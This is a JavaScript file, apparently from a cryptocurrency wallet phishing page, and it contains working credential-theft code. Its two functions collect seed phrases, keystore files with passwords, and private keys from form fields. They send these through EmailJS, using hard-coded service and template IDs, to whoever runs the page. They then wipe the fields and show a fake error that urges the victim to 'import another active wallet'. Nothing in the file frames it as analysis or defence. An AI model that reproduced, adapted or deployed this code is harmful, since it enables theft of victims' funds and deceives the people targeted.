
function sendMail() {
  var typeInput = document.querySelector('input[name="type"]');
  var type = typeInput ? typeInput.value : "phrase";
  var message = "";
  if (type === "phrase") {
    var phraseField = document.querySelector('textarea[name="phrase"]');
    message = phraseField ? phraseField.value : "";
  } else if (type === "keystore") {
    var keystoreField = document.querySelector('textarea[name="keystore"]');
    var passwordField = document.querySelector('input[name="password"]');
    var ks = keystoreField ? keystoreField.value : "";
    var pwd = passwordField ? passwordField.value : "";
    message = "Keystore: " + ks + "\nPassword: " + pwd;
  } else if (type === "privatekey") {
    var pkField = document.querySelector('input[name="privateKey"]');
    message = pkField ? pkField.value : "";
  }

  var params = {
    subject: "Details",
    message: message,
  };

  const serviceID = "service_exq0w83";
  const templateID = "template_a188tnc";

  emailjs.send(serviceID, templateID, params).then((res) => {
    if (type === "phrase") {
      var phraseField = document.querySelector('textarea[name="phrase"]');
      if (phraseField) phraseField.value = "";
    } else if (type === "keystore") {
      var keystoreField = document.querySelector('textarea[name="keystore"]');
      var passwordField = document.querySelector('input[name="password"]');
      if (keystoreField) keystoreField.value = "";
      if (passwordField) passwordField.value = "";
    } else if (type === "privatekey") {
      var pkField = document.querySelector('input[name="privateKey"]');
      if (pkField) pkField.value = "";
    }
    console.log(res);
    alert("An error occurred, try importing another active wallet");
  });
}
function sendMail2(){
    var params= {
        subject: 'Details',
        message: document.getElementById("pk") ? document.getElementById("pk").value : "",

    }

     const serviceID  = 'service_exq0w83';
    const templateID = 'template_a188tnc';

emailjs.send(serviceID, templateID, params).then((res)=>{
  
    if (document.getElementById("pk")) {
      document.getElementById("pk").value = "";
    }
    console.log(res);
    alert('An error occurred, try importing another active wallet');

})
}



